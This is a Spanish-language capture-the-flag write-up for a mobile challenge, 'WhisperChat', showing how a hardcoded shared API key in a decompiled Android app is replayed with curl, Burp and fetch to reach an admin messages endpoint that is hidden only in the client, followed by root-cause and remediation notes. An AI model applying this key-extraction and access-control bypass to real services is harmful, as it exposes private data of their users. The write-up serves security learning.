![[Pasted image 20260704085828.png]]![[Pasted image 20260704090001.png|692]]

---

## title: WhisperChat - Broken Access Control via Shared API Key tags: [ctf, mobile, android, apk, broken-access-control, idor, reverse-engineering] category: Mobile/Web difficulty: Easy-Medium status: Resuelto

# WhisperChat — Broken Access Control (Admin Feed Reachable by Anyone)

## 📋 Resumen

|Campo|Valor|
|---|---|
|**Servicio**|WhisperChat API v1.4.2|
|**Plataforma**|App Android (APK decompilado) + backend REST|
|**Vulnerabilidad**|Broken Access Control (autorización solo en el cliente)|
|**Endpoint objetivo**|`GET /api/admin/messages`|
|**Flag**|_(pendiente de confirmar — pegar aquí una vez obtenida)_|

## 🎯 Contexto

Se entregaron dos artefactos:

1. Un **APK decompilado** de la app oficial de WhisperChat (Java + `AndroidManifest.xml` + `strings.xml`).
2. Un **cliente Python** de referencia (`whisper_client.py`) que habla con el mismo backend.

Ambos comparten la misma API key hardcodeada:

```
X-API-Key: fluidctf-api-2026-whispers
```

## 🔍 Análisis del código decompilado

### 1. La API key está hardcodeada en texto plano — dos veces

**En `strings.xml`:**

```xml
<string name="api_base_url">https://api.whisperchat.internal</string>
<string name="api_key">fluidctf-api-2026-whispers</string>
```

**En `ApiClient.java`** (se inyecta en _cada_ petición vía interceptor de OkHttp):

```java
private static final String API_KEY = "fluidctf-api-2026-whispers";
...
Request request = chain.request().newBuilder()
        .header("X-API-Key", API_KEY)
        .header("User-Agent", "WhisperChat/1.4.2 (Android 14; SDK 34)")
        .build();
```

Es la **misma key para todos los usuarios** — no identifica ni autoriza a nadie en particular, solo demuestra que la petición viene "de la app oficial".

### 2. El endpoint admin existe en el contrato de la API, con advertencia explícita en el comentario

**En `WhisperApi.java`:**

```java
/* Admin console feed: every channel, including private staff threads.
 * Reached from SettingsActivity only when the account is staff, but the
 * call carries the same shared API key as everything else. */
@GET("api/admin/messages")
Call<MessageList> getAdminMessages();
```

### 3. El control de acceso vive solo en la UI, no en el servidor

**En `SettingsActivity.java`:**

```java
// Staff-only console entry. Hidden for normal accounts, but the
// backend never checks anything beyond the shared API key, so the
// route it opens is reachable by anyone replaying that key.
View adminEntry = findViewById(R.id.admin_console_entry);
adminEntry.setVisibility(Session.current().isAdmin() ? View.VISIBLE : View.GONE);
```

```java
// GET /api/admin/messages returns every channel, including the
// private ops thread that holds the quarterly vault recovery code.
private void loadAdminFeed() {
    ApiClient.get().getAdminMessages().enqueue(...);
}
```

**Conclusión del análisis:** la app solo _oculta el botón_ si el usuario no es admin (`View.GONE`). El backend, según los propios comentarios del código, **nunca vuelve a verificar el rol** — solo exige la misma `X-API-Key` que cualquier instalación de la app ya trae de fábrica. Esto es **Broken Access Control (OWASP API1:2023 / A01:2021)**: la autorización se decidió únicamente en el cliente, que es un lugar donde el atacante tiene control total.

## 🛠️ Explotación

### Paso 1 — Identificar el host real del reto

El `API_BASE` del código (`https://api.whisperchat.internal`) es un hostname interno ficticio, no accesible desde fuera. La plataforma CTF expone el mismo backend bajo un dominio público:

```
https://<host-del-reto>.chal.ctf.ae
```

Confirmado visitando la raíz del sitio:

```json
{"service":"WhisperChat API","status":"operational","version":"1.4.2"}
```

### Paso 2 — Llamar directamente al endpoint admin con la key hardcodeada

No hace falta login, sesión, ni ser "staff" — basta con reproducir el mismo header que pone la app:

```bash
curl -s "https://<host-del-reto>/api/admin/messages" \
  -H "X-API-Key: fluidctf-api-2026-whispers" \
  -H "Content-Type: application/json"
```

Equivalente en Burp Repeater:

```
GET /api/admin/messages HTTP/1.1
Host: <host-del-reto>
X-API-Key: fluidctf-api-2026-whispers
Content-Type: application/json
Connection: close
```

Equivalente en la consola JS del navegador (sin necesidad de terminal):

```javascript
fetch("https://<host-del-reto>/api/admin/messages", {
  headers: { "X-API-Key": "fluidctf-api-2026-whispers" }
}).then(r => r.json()).then(console.log)
```

### Paso 3 — Leer el "private ops thread"

Según el comentario del código, ese hilo privado contiene _"the quarterly vault recovery code"_ — ahí es donde se espera encontrar la flag, dentro del `body` de alguno de los mensajes devueltos por `/api/admin/messages`.

## ❓ Por qué funciona sin ser admin

No existe ningún chequeo de rol del lado servidor documentado en el código — el comentario lo dice explícitamente: _"the backend never checks anything beyond the shared API key"_. Como la key es idéntica para toda la base de usuarios (viene compilada en el APK), **cualquiera que extraiga el APK y decompile las strings** tiene, de hecho, las mismas credenciales que un admin frente a este endpoint.

## 🩹 Causa raíz y remediación

**Causa raíz:**

- Autorización decidida solo en el cliente (visibilidad de un botón), nunca revalidada en el servidor.
- Uso de una API key compartida y estática como único mecanismo de "autenticación", sin relación con la identidad ni el rol del usuario.

**Remediación:**

- El servidor debe verificar el **rol/identidad real del usuario autenticado** (ej. JWT de sesión con claim `role: admin`, verificado en cada request) antes de servir `/api/admin/messages` — nunca confiar en qué botones mostró el cliente.
- Eliminar las API keys estáticas y globales; usar tokens de sesión individuales, revocables y con scope/rol asociado.
- Auditar el APK en busca de secretos hardcodeados antes de cada release (la key está en texto plano tanto en `strings.xml` como en `ApiClient.java`).

## 🏷️ Tags relacionados

#broken-access-control #owasp-api1 #hardcoded-secrets #apk-reversing #idor #ctf-mobile